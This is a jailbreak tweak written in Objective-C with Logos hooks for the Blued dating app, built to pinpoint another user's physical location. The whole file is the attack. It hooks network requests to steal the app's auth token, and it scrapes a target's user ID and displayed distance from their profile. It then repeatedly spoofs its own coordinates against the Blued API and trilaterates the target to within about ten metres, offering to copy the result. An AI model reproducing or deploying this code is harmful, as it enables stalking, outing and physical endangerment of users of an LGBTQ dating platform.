#import <substrate.h>
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <math.h>
#import <objc/runtime.h>

// 核心配置
#define TRACK_BTN_TAG 100001
#define MAX_RECURSIVE_ATTEMPTS 12
#define LOCK_THRESHOLD 0.01
#define EARTH_RADIUS_KM 111.32

// 全局静态变量
static NSString *g_bluedBasicToken = nil;
static NSString *g_currentTargetUid = nil;
static double g_initialDistance = -1.0;

// ====================== 1. 全局Token自动抓取（无依赖，最先定义） ======================
%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    NSDictionary *headers = request.allHTTPHeaderFields;
    NSString *authHeader = headers[@"authorization"] ?: headers[@"Authorization"];
    if (authHeader && [authHeader hasPrefix:@"Basic "]) {
        NSString *basicToken = [authHeader substringFromIndex:6];
        if (basicToken.length > 0 && ![g_bluedBasicToken isEqualToString:basicToken]) {
            g_bluedBasicToken = basicToken;
            NSLog(@"[TrackHook] 成功抓取Basic Token");
        }
    }
    return %orig(request, completionHandler);
}
%end

// ====================== 2. 核心Hook：UIApplication（严格按「先定义方法，后调用」顺序） ======================
%hook UIApplication

// ---------------------- 【第一优先级：基础工具方法】 ----------------------
%new
- (UIWindow *)getCurrentMainWindow {
    UIWindow *targetWindow = nil;
    if (@available(iOS 13.0, *)) {
        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive) {
                for (UIWindow *window in scene.windows) {
                    if (window.isKeyWindow) {
                        targetWindow = window;
                        break;
                    }
                }
                if (targetWindow) break;
            }
        }
    }
    // 多层兜底，100%兼容iOS15+
    if (!targetWindow) targetWindow = [UIApplication sharedApplication].keyWindow;
    if (!targetWindow) targetWindow = [UIApplication sharedApplication].windows.firstObject;
    return targetWindow;
}

// ---------------------- 【第二优先级：UI工具方法】 ----------------------
%new
- (void)showToast:(NSString *)message duration:(NSTimeInterval)duration {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *window = [self getCurrentMainWindow];
        if (!window) return;
        
        // 移除旧Toast避免重复
        for (UIView *subview in window.subviews) {
            if ([subview isKindOfClass:[UILabel class]] && subview.tag == 99999) {
                [subview removeFromSuperview];
            }
        }
        
        CGFloat toastWidth = 300;
        CGFloat toastHeight = 100;
        UILabel *toastLabel = [[UILabel alloc] initWithFrame:CGRectMake(
            (window.bounds.size.width - toastWidth)/2,
            (window.bounds.size.height - toastHeight)/2,
            toastWidth,
            toastHeight
        )];
        toastLabel.tag = 99999;
        toastLabel.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
        toastLabel.textColor = [UIColor whiteColor];
        toastLabel.textAlignment = NSTextAlignmentCenter;
        toastLabel.numberOfLines = 0;
        toastLabel.font = [UIFont systemFontOfSize:14 weight:UIFontWeightMedium];
        toastLabel.text = message;
        toastLabel.layer.cornerRadius = 12;
        toastLabel.clipsToBounds = YES;
        toastLabel.layer.zPosition = MAXFLOAT + 1;
        
        [window addSubview:toastLabel];
        
        // 渐隐动画
        [UIView animateWithDuration:0.5 delay:duration options:0 animations:^{
            toastLabel.alpha = 0;
        } completion:^(BOOL finished) {
            [toastLabel removeFromSuperview];
        }];
    });
}

%new
- (void)showResultWithSuccess:(BOOL)success message:(NSString *)message lat:(double)lat lng:(double)lng {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *window = [self getCurrentMainWindow];
        if (!window) return;
        
        if (success) {
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"🎯 雷达锁定成功" message:[NSString stringWithFormat:@"%@\n\n可直接复制至漫游中心空降。", message] preferredStyle:UIAlertControllerStyleAlert];
            
            [alert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                UIPasteboard *pasteboard = [UIPasteboard generalPasteboard];
                pasteboard.string = [NSString stringWithFormat:@"%.8f, %.8f", lat, lng];
                [self showToast:@"复制成功" duration:2.0];
            }]];
            
            [alert addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            
            [window.rootViewController presentViewController:alert animated:YES completion:nil];
        } else {
            [self showToast:[NSString stringWithFormat:@"追踪失败: %@", message] duration:4.0];
        }
    });
}

// ---------------------- 【第三优先级：定位算法工具方法】 ----------------------
%new
- (void)updateMyServerLocationWithToken:(NSString *)token lat:(double)lat lng:(double)lng {
    NSString *urlString = [NSString stringWithFormat:@"https://argo.blued.cn/users?sort_by=nearby&latitude=%.8f&longitude=%.8f&limit=1", lat, lng];
    NSURL *url = [NSURL URLWithString:urlString];
    if (!url) return;
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"GET";
    [request setValue:[NSString stringWithFormat:@"Basic %@", token] forHTTPHeaderField:@"authorization"];
    [request setValue:@"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15" forHTTPHeaderField:@"user-agent"];
    request.timeoutInterval = 3.0;
    
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        dispatch_semaphore_signal(semaphore);
    }];
    [task resume];
    dispatch_semaphore_wait(semaphore, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.5 * NSEC_PER_SEC)));
}

%new
- (double)fetchDynamicDistanceWithUid:(NSString *)uid token:(NSString *)token fakeLat:(double)fakeLat fakeLng:(double)fakeLng {
    [self updateMyServerLocationWithToken:token lat:fakeLat lng:fakeLng];
    [NSThread sleepForTimeInterval:1.0]; // 等待服务器坐标同步
    
    NSString *urlString = [NSString stringWithFormat:@"https://argo.blued.cn/users/%@/basic", uid];
    NSURL *url = [NSURL URLWithString:urlString];
    if (!url) return -1.0;
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"GET";
    [request setValue:[NSString stringWithFormat:@"Basic %@", token] forHTTPHeaderField:@"authorization"];
    [request setValue:@"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15" forHTTPHeaderField:@"user-agent"];
    request.timeoutInterval = 3.0;
    
    __block double resultDistance = -1.0;
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (!error && data) {
            @try {
                NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                if (json) {
                    NSArray *dataArray = json[@"data"];
                    if (dataArray && dataArray.count > 0) {
                        NSDictionary *userData = dataArray[0];
                        int isHideDistance = [userData[@"is_hide_distance"] intValue];
                        if (isHideDistance == 0) {
                            resultDistance = [userData[@"distance"] doubleValue];
                        }
                    }
                }
            } @catch (NSException *exception) {}
        }
        dispatch_semaphore_signal(semaphore);
    }];
    [task resume];
    dispatch_semaphore_wait(semaphore, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.5 * NSEC_PER_SEC)));
    
    return resultDistance;
}

%new
- (NSArray *)calculateIntersectionsWithLat1:(double)lat1 lng1:(double)lng1 r1:(double)r1 lat2:(double)lat2 lng2:(double)lng2 r2:(double)r2 {
    NSMutableArray *intersections = [NSMutableArray array];
    
    double x1 = 0.0;
    double y1 = 0.0;
    double x2 = (lng2 - lng1) * EARTH_RADIUS_KM * cos(lat1 * M_PI / 180.0);
    double y2 = (lat2 - lat1) * EARTH_RADIUS_KM;
    
    double d = sqrt(x2 * x2 + y2 * y2);
    // 无相交判断
    if (d > r1 + r2 || d < fabs(r1 - r2) || d == 0.0) {
        return intersections;
    }
    
    // 几何方程求解交点
    double a = (r1 * r1 - r2 * r2 + d * d) / (2 * d);
    double h = sqrt(fmax(0.0, r1 * r1 - a * a));
    
    double x3 = x1 + a * (x2 - x1) / d;
    double y3 = y1 + a * (y2 - y1) / d;
    
    double rx = -h * (y2 - y1) / d;
    double ry = h * (x2 - x1) / d;
    
    // 两个交点坐标转换回经纬度
    double resLat1 = lat1 + (y3 + ry) / EARTH_RADIUS_KM;
    double resLng1 = lng1 + (x3 + rx) / (EARTH_RADIUS_KM * cos(lat1 * M_PI / 180.0));
    double resLat2 = lat1 + (y3 - ry) / EARTH_RADIUS_KM;
    double resLng2 = lng1 + (x3 - rx) / (EARTH_RADIUS_KM * cos(lat1 * M_PI / 180.0));
    
    [intersections addObject:@[@(resLat1), @(resLng1)]];
    [intersections addObject:@[@(resLat2), @(resLng2)]];
    
    return intersections;
}

// ---------------------- 【第四优先级：业务核心方法】 ----------------------
%new
- (void)autoFetchCurrentPageUserInfo {
    // 重置数据
    g_currentTargetUid = nil;
    g_initialDistance = -1.0;
    
    UIWindow *window = [self getCurrentMainWindow];
    if (!window) return;
    
    // 获取当前顶层显示的页面（用户主页）
    UIViewController *topVC = window.rootViewController;
    while (topVC.presentedViewController) {
        topVC = topVC.presentedViewController;
    }
    if ([topVC isKindOfClass:[UINavigationController class]]) {
        topVC = ((UINavigationController *)topVC).topViewController;
    }
    if (!topVC) return;
    
    NSLog(@"[TrackHook] 当前页面VC: %@", NSStringFromClass([topVC class]));
    
    // runtime遍历页面属性，抓取UID和距离
    unsigned int propertyCount = 0;
    objc_property_t *properties = class_copyPropertyList([topVC class], &propertyCount);
    
    for (int i = 0; i < propertyCount; i++) {
        objc_property_t property = properties[i];
        NSString *propertyName = [NSString stringWithUTF8String:property_getName(property)];
        
        @try {
            id userModel = [topVC valueForKey:propertyName];
            if (!userModel) continue;
            
            // 提取用户UID
            NSString *tempUid = [userModel valueForKey:@"uid"] ?: [userModel valueForKey:@"user_id"];
            if (tempUid && tempUid.length > 0) {
                g_currentTargetUid = tempUid;
                NSLog(@"[TrackHook] 成功抓取目标UID: %@", g_currentTargetUid);
                
                // 提取初始距离，兼容数字/字符串两种格式
                id distanceObj = [userModel valueForKey:@"distance"];
                if (distanceObj) {
                    if ([distanceObj isKindOfClass:[NSNumber class]]) {
                        g_initialDistance = [distanceObj doubleValue];
                    } else if ([distanceObj isKindOfClass:[NSString class]]) {
                        NSCharacterSet *nonNumSet = [[NSCharacterSet characterSetWithCharactersInString:@"0123456789."] invertedSet];
                        NSString *cleanDistStr = [(NSString *)distanceObj stringByTrimmingCharactersInSet:nonNumSet];
                        g_initialDistance = cleanDistStr.doubleValue;
                    }
                    NSLog(@"[TrackHook] 成功抓取初始距离: %.2f km", g_initialDistance);
                }
                break;
            }
        } @catch (NSException *exception) {
            continue;
        }
    }
    free(properties);
    
    // 兜底方案：从页面参数中获取UID
    if (!g_currentTargetUid) {
        @try {
            NSDictionary *params = [topVC valueForKey:@"queryParameters"];
            if (params) {
                g_currentTargetUid = params[@"uid"] ?: params[@"user_id"];
                if (g_currentTargetUid) {
                    NSLog(@"[TrackHook] 从页面参数抓取到UID: %@", g_currentTargetUid);
                }
            }
        } @catch (NSException *exception) {}
    }
}

%new
- (void)runRecursiveTrilaterationWithUid:(NSString *)uid token:(NSString *)token startLat:(double)startLat startLng:(double)startLng startDist:(double)startDist {
    double currentLat = startLat;
    double currentLng = startLng;
    double currentDist = startDist;
    
    int attempts = 0;
    
    while (attempts < MAX_RECURSIVE_ATTEMPTS) {
        attempts++;
        
        // 达到锁定阈值，直接返回结果
        if (currentDist <= LOCK_THRESHOLD) {
            NSString *resultMsg = [NSString stringWithFormat:@"🎯 极限锁定！\n纬度: %.8f\n经度: %.8f\n最终误差: %.4fkm", currentLat, currentLng, currentDist];
            [self showResultWithSuccess:YES message:resultMsg lat:currentLat lng:currentLng];
            return;
        }
        
        // 主线程更新进度提示
        dispatch_async(dispatch_get_main_queue(), ^{
            [self showToast:[NSString stringWithFormat:@"正在进行第 %d 次圆交点计算...\n当前圆心距离: %.2fkm", attempts, currentDist] duration:2.0];
        });
        
        // 生成探测点：向正东偏移当前距离
        double offsetLat = currentLat;
        double offsetLng = currentLng + (currentDist / (EARTH_RADIUS_KM * cos(currentLat * M_PI / 180.0)));
        
        // 获取探测点的目标距离
        double newDist = [self fetchDynamicDistanceWithUid:uid token:token fakeLat:offsetLat fakeLng:offsetLng];
        if (newDist < 0) {
            [self showResultWithSuccess:NO message:@"获取探测点距离失败" lat:0.0 lng:0.0];
            return;
        }
        
        // 计算两圆交点
        NSArray *intersections = [self calculateIntersectionsWithLat1:currentLat lng1:currentLng r1:currentDist lat2:offsetLat lng2:offsetLng r2:newDist];
        if (intersections.count == 0) {
            // 无交点时向外扩10%重试
            currentLng += (currentDist * 0.1) / (EARTH_RADIUS_KM * cos(currentLat * M_PI / 180.0));
            continue;
        }
        
        // 验证两个交点
        dispatch_async(dispatch_get_main_queue(), ^{
            [self showToast:@"求得两处空间交汇点，正在实地验证..." duration:2.0];
        });
        
        NSArray *p1 = intersections[0];
        NSArray *p2 = intersections[1];
        double p1Lat = [p1[0] doubleValue];
        double p1Lng = [p1[1] doubleValue];
        double p2Lat = [p2[0] doubleValue];
        double p2Lng = [p2[1] doubleValue];
        
        double d1 = [self fetchDynamicDistanceWithUid:uid token:token fakeLat:p1Lat fakeLng:p1Lng];
        double d2 = [self fetchDynamicDistanceWithUid:uid token:token fakeLat:p2Lat fakeLng:p2Lng];
        
        if (d1 < 0 && d2 < 0) {
            [self showResultWithSuccess:NO message:@"交点验证失败" lat:0.0 lng:0.0];
            return;
        }
        
        // 选择距离更小的交点作为新圆心，进入下一次迭代
        if (d1 >= 0 && (d2 < 0 || d1 < d2)) {
            currentLat = p1Lat;
            currentLng = p1Lng;
            currentDist = d1;
        } else {
            currentLat = p2Lat;
            currentLng = p2Lng;
            currentDist = d2;
        }
    }
    
    // 达到最大迭代次数，返回最优结果
    NSString *resultMsg = [NSString stringWithFormat:@"计算结束，已逼近目标区域。\n纬度: %.8f\n经度: %.8f\n最终误差: %.4fkm", currentLat, currentLng, currentDist];
    [self showResultWithSuccess:YES message:resultMsg lat:currentLat lng:currentLng];
}

// ---------------------- 【第五优先级：按钮相关方法】 ----------------------
%new
- (void)addTrackFloatButton {
    UIWindow *window = [self getCurrentMainWindow];
    if (!window) return;
    
    // 防止重复创建按钮
    UIView *existBtn = [window viewWithTag:TRACK_BTN_TAG];
    if (existBtn) return;

    // 创建悬浮按钮
    UIButton *trackBtn = [UIButton buttonWithType:UIButtonTypeCustom];
    trackBtn.tag = TRACK_BTN_TAG;
    [trackBtn setTitle:@"🛰️ 递归几何定位" forState:UIControlStateNormal];
    trackBtn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
    [trackBtn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    trackBtn.backgroundColor = [UIColor colorWithRed:0.91 green:0.12 blue:0.39 alpha:1.0];
    trackBtn.layer.cornerRadius = 22;
    trackBtn.layer.borderWidth = 2;
    trackBtn.layer.borderColor = [UIColor whiteColor].CGColor;
    trackBtn.clipsToBounds = YES;
    
    // 固定在屏幕右上角，适配所有机型
    CGFloat screenWidth = [UIScreen mainScreen].bounds.size.width;
    trackBtn.frame = CGRectMake(screenWidth - 160, 180, 130, 44);
    trackBtn.layer.zPosition = MAXFLOAT; // 最高层级，永远不被遮挡
    
    // 绑定点击事件
    [trackBtn addTarget:self action:@selector(onTrackButtonClick) forControlEvents:UIControlEventTouchUpInside];
    
    [window addSubview:trackBtn];
    NSLog(@"[TrackHook] 悬浮按钮已成功添加到屏幕");
}

// ---------------------- 【第六优先级：按钮点击事件】 ----------------------
%new
- (void)onTrackButtonClick {
    // 自动抓取当前打开的用户主页信息
    [self autoFetchCurrentPageUserInfo];
    
    // 参数校验
    if (!g_currentTargetUid || g_currentTargetUid.length == 0) {
        [self showToast:@"❌ 请先打开目标用户的个人主页" duration:3.0];
        return;
    }
    if (g_initialDistance < 0) {
        [self showToast:@"❌ 无法解析此人的距离" duration:3.0];
        return;
    }
    if (g_initialDistance >= 9999.0 || g_initialDistance <= 0.0) {
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"⚠️ 追踪中止" message:[NSString stringWithFormat:@"目标开启了高阶隐身，下发了无效距离 (%.2f)。", g_initialDistance] preferredStyle:UIAlertControllerStyleAlert];
        [alert addAction:[UIAlertAction actionWithTitle:@"我知道了" style:UIAlertActionStyleDefault handler:nil]];
        [[self getCurrentMainWindow].rootViewController presentViewController:alert animated:YES completion:nil];
        return;
    }
    if (!g_bluedBasicToken || g_bluedBasicToken.length == 0) {
        [self showToast:@"Token为空！请先刷一下附近人页面再试" duration:4.0];
        return;
    }
    
    // 获取自己的初始坐标
    NSUserDefaults *bluedDefaults = [[NSUserDefaults alloc] initWithSuiteName:@"com.bluecity.blued"];
    double initialLat = [bluedDefaults doubleForKey:@"current_latitude"] ?: [bluedDefaults doubleForKey:@"my_latitude"];
    double initialLng = [bluedDefaults doubleForKey:@"current_longitude"] ?: [bluedDefaults doubleForKey:@"my_longitude"];
    
    if (initialLat == 0 || initialLng == 0) {
        [self showToast:@"无法获取当前坐标，请刷新附近人页面" duration:3.0];
        return;
    }
    
    // 启动递归定位
    [self showToast:[NSString stringWithFormat:@"雷达启动！\n原点距离: %.2fkm\n开始递归计算交点...", g_initialDistance] duration:4.0];
    
    // 子线程执行算法，避免主线程卡顿
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @try {
            [self runRecursiveTrilaterationWithUid:g_currentTargetUid token:g_bluedBasicToken startLat:initialLat startLng:initialLng startDist:g_initialDistance];
        } @catch (NSException *exception) {
            dispatch_async(dispatch_get_main_queue(), ^{
                [self showToast:[NSString stringWithFormat:@"算法崩溃: %@", exception.reason] duration:4.0];
            });
        }
    });
}

// ---------------------- 【最后：App生命周期入口，所有方法已定义完成，安全调用】 ----------------------
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    BOOL result = %orig;
    // 延迟0.5秒，保证App窗口完全初始化
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [self addTrackFloatButton];
    });
    return result;
}

%end